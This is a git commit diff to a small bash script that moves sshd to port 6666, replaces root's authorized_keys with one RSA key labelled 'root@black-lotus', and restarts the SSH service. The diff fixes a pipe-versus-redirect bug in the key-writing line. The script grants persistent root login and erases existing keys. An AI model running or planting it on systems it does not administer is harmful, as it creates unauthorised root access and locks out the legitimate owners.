078783d99d8f7cc825f4a78a6d496df9e1878d8c
Scott Beasley <19320511+scottwilliambeasley@users.noreply.github.com>
2018-08-16 23:17:03 -0500

    Update modify_ssh.sh

--- modify_ssh.sh
+++ modify_ssh.sh
@@ -1,4 +1,6 @@
 #!/bin/bash                                             
 sed -i '/#Port 2/c\Port 6666' /etc/ssh/sshd_config
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmaUCgLA9JRgIntHhnAqNdcLWrYWtGHObZ+4SN354U7AOiZTtbMrPQjCN7tHnxMGAYOtzxkBgd8FmLzjIRJtZOf5mDGejToGkrY2WV0e9hZpeLedJdZ/w1sm/2S9GdRW9dBiB6tT+Jeo6gGIGN8gZyaPyHuvkCoLuPerVncNX+VaMfPCxJruQKVOxA1rKzFYdXMGT1EtVtSbcaCJoQlr4QiTxNTF5I1EZtRxdPuOR/BoPbz8DTlKQuNS38owWrZBh8HUHbxuqCLNgMC2YTYbxHZCKU1YI60QKLQpWKV3yHghs7+kdFC2L5Z6qzIA90G6GnyqsDUAoi7XUzw53SKsVz root@black-lotus' | /root/.ssh/authorized_keys
+mkdir -p /root/.ssh/
+touch /root/.ssh/authorized_keys
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmaUCgLA9JRgIntHhnAqNdcLWrYWtGHObZ+4SN354U7AOiZTtbMrPQjCN7tHnxMGAYOtzxkBgd8FmLzjIRJtZOf5mDGejToGkrY2WV0e9hZpeLedJdZ/w1sm/2S9GdRW9dBiB6tT+Jeo6gGIGN8gZyaPyHuvkCoLuPerVncNX+VaMfPCxJruQKVOxA1rKzFYdXMGT1EtVtSbcaCJoQlr4QiTxNTF5I1EZtRxdPuOR/BoPbz8DTlKQuNS38owWrZBh8HUHbxuqCLNgMC2YTYbxHZCKU1YI60QKLQpWKV3yHghs7+kdFC2L5Z6qzIA90G6GnyqsDUAoi7XUzw53SKsVz root@black-lotus' > /root/.ssh/authorized_keys
 service sshd restart
